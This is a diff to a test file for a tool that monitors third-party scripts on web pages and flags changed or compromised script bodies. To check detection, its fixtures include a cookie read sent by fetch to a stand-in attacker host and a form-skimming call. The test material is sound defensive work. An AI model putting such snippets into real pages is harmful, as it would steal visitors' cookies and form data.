@@ -3,7 +3,7 @@ import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 import { parseConfig } from '../src/config.js';
-import type { CapturedScript, CrawlResult } from '../src/crawl.js';
+import { variantKey, type CapturedScript, type CrawlResult } from '../src/crawl.js';
 import { applyCrawl } from '../src/detect.js';
 import { scriptKey, sha256 } from '../src/script-key.js';
 import { DataStore, emptyState, reviewKeyFor, type State } from '../src/state.js';
@@ -26,7 +26,8 @@ interface Load {
 function crawlOf(loads: Load[], errors: Record<string, string> = {}): CrawlResult {
   const scripts = new Map<string, CapturedScript>();
   for (const load of loads) {
-    scripts.set(load.url, {
+    const first = scripts.get(load.url);
+    scripts.set(first ? variantKey(load.url, sha256(load.body)) : load.url, {
       url: load.url,
       key: scriptKey(load.url),
       host: new URL(load.url).hostname,
@@ -207,7 +208,7 @@ describe('applyCrawl', () => {
     expect(state.pages[ARTICLE]).toMatchObject({ error: 'Error: HTTP 404', scriptKeys: [] });
     expect(state.history.at(-1)).toMatchObject({ type: 'error', page: ARTICLE });
   });
-  it('stops reviewing scripts that are generated per request', async () => {
+  it('compares scripts generated per request leniently after the first time', async () => {
     const conversion = (title: string, n: number) => ({
       url: `https://conv.example/p/?random=${n}`,
       body: `track({title:"${title}",t:${n}})`,
@@ -221,11 +222,70 @@ describe('applyCrawl', () => {
       ],
       day(2),
     );
-    expect(detection.changes).toEqual([]);
+    // The run that first shows different bodies reviews the odd one: it could target a page
+    expect(detection.changes).toMatchObject([{ kind: 'changed' }]);
     expect(state.scripts['https://conv.example/p/']!.perRequest).toBe(true);
-    expect(state.history.at(-1)).toMatchObject({ type: 'review-skipped' });
+    expect(state.history.some((event) => event.type === 'review-skipped')).toBe(true);
     const later = await run([conversion('Something else', 4)], day(3));
     expect(later.changes).toEqual([]);
     expect(later.absorbed).toBe(1);
+  });
+
+  // Earlier tests stopped here: once a script was marked per request, no change was ever
+  // reviewed again, and only the first body of a run was looked at.
+  it('still reviews a per-request script that adds a host or risky calls', async () => {
+    const conversion = (title: string, n: number, extra = '') => ({
+      url: `https://conv.example/p/?random=${n}`,
+      body: `track({title:"${title}",t:${n}});${extra}`,
+    });
+    await run([conversion('Home', 1)], day(1));
+    await run(
+      [
+        { ...conversion('Home', 2), pages: [HOME] },
+        { ...conversion('Article', 3), pages: [ARTICLE] },
+      ],
+      day(2),
+    );
+    expect(state.scripts['https://conv.example/p/']!.perRequest).toBe(true);
+    const detection = await run(
+      [conversion('Home', 4, 'document.cookie;fetch("https://c.evil.example/x")')],
+      day(3),
+    );
+    expect(detection.changes).toMatchObject([{ kind: 'changed', key: 'https://conv.example/p/' }]);
+  });
+
+  it('reviews again once several pages get the same body', async () => {
+    const body = 'track({title:"same"})';
+    await run([{ url: 'https://conv.example/p/', body: 'track({title:"a"})' }], day(1));
+    await run(
+      [
+        { url: 'https://conv.example/p/?x=1', body: 'track({title:"b"})', pages: [HOME] },
+        { url: 'https://conv.example/p/?x=2', body: 'track({title:"c"})', pages: [ARTICLE] },
+      ],
+      day(2),
+    );
+    expect(state.scripts['https://conv.example/p/']!.perRequest).toBe(true);
+    await run([{ url: 'https://conv.example/p/', body, pages: [HOME, ARTICLE] }], day(3));
+    expect(state.scripts['https://conv.example/p/']!.perRequest).toBeUndefined();
+    const detection = await run(
+      [{ url: 'https://conv.example/p/', body: 'track({title:"other"})', pages: [HOME, ARTICLE] }],
+      day(4),
+    );
+    expect(detection.changes).toMatchObject([{ kind: 'changed' }]);
+  });
+
+  it('detects a compromised body served to one page only', async () => {
+    const url = 'https://cdn.vendor.example/w.js';
+    await run([{ url, body: 'widget()', pages: [HOME, ARTICLE] }], day(1));
+    const detection = await run(
+      [
+        { url, body: 'widget()', pages: [HOME] },
+        { url, body: 'widget();skim(document.forms)', pages: [ARTICLE] },
+      ],
+      day(2),
+    );
+    expect(detection.changes).toMatchObject([
+      { kind: 'changed', newSha256: sha256('widget();skim(document.forms)') },
+    ]);
   });
 });
